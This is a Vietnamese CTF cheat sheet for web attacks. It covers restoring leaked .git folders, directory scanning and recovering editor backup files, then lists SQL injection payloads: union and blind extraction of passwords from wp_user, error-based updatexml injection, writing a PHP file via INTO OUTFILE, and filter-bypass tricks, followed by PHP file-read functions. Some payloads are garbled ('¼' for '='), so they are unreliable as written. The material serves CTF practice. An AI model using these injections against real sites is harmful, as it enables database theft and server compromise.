# CTF

# 1.1 Significant “Information Gathering”

## 1.1.1 Information leaks

Dùng tool [scrabble](https://github.com/denny0223/scrabble) để clone và restore .git folder

```
$ ./scrabble https://example.com/
```

Dùng `git reset --hard HEAD^` để về HEAD trước đó

Dùng tool [dirsearch](https://github.com/maurosoria/dirsearch) để scan default directories

```
$ python3 dirsearch.py -u https://target -e php,html,js -w /path/to/wordlist
```

## 1.1.2 Sensitive Backup Files

Dùng `~` thêm vào sau tên file để check gedit backup file

```
flag -> flag~
```

Dùng `.swp` thêm vào sau tên file để check vim backup file (khi bị tắt đột ngột), muốn restore nội dung thì ta làm như sau:

```
# Tạo file trùng tên
$ touch flag
# Restore file flag.swp
$ vim -r flag
# Result
$ cat flag
flag{tes}
```

## 1.1.3 Banner Indentification

Dùng [Wappalyzer](https://www.wappalyzer.com/) để scan banner information:

Hoặc dùng `buidtwith` trong python:

```
 
import builtwith

website = "https://example.com"  # Replace with the URL you want to analyze

results = builtwith.builtwith(website)

# Access the detected technologies
for category, technologies in results.items():
    print(category)
    for technology in technologies:
        print(technology)
```

# 1.2 SQL Injection

Dùng `group_concat()` (MySQL) hàm này dùng dấu `,` để combine các hàng được trả về từ bản ghi

```
?id=-1 union
select 1, group_concat(column_name) from information _schema.columns where table_name ¼ 'wp_user'
```

Dùng `mid()` (MySQL) hàm này giống `substring()` và `substr()`

```
SELECT title, content FROM wp_news WHERE id = '1' AND (SELECT MID((SELECT concat(user, 0x7e, pwd) FROM wp_user), 1, 1)) = 'a'
```

Dùng `updatexml()` (MySQL) hàm này để trigger Error based sqli

```
?id¼1' or updatexml(1, concat(0x7e,(select pwd from wp_user)),1)%23
```

Dùng `as` để trigger hiển thị ra màn hình

```
?id=(select%20pwd%20from%20wp_user)%20as%20title

# Hoặc cũng có thể sử dụng như sau:
$res = mysqli_query($conn, "SELECT title FROM ${_GET['table']}");

SELECT title FROM (SELECT pwd AS title FROM wp_user)x;
```

Dùng `into outfile` để ghi webshell vào nơi có quyền ghi file:

```
SELECT xx INTO outfile "/tmp/xxx.php" LINES TERMINATED BY '<?php phpinfo();?>'
```

Dùng `%09` để bypass replace th space (`%20`)

```
p?id=-1%09union%09selselectect%091,2
```

Dùng `sEleCT` để bypass match `SELECT`

Dùng `\bselect\b` hoặc `/*!50000select*/` để bypass 


# 1.3 Arbitrary File Read Vulnerability

## 1.3.1 PHP

Dùng `file_get_content(), file(), fopen(), fread(), fget(),...`
Dùng `include(), require(), include_once(), require_once(),...`
Dùng `system(), exec(),...`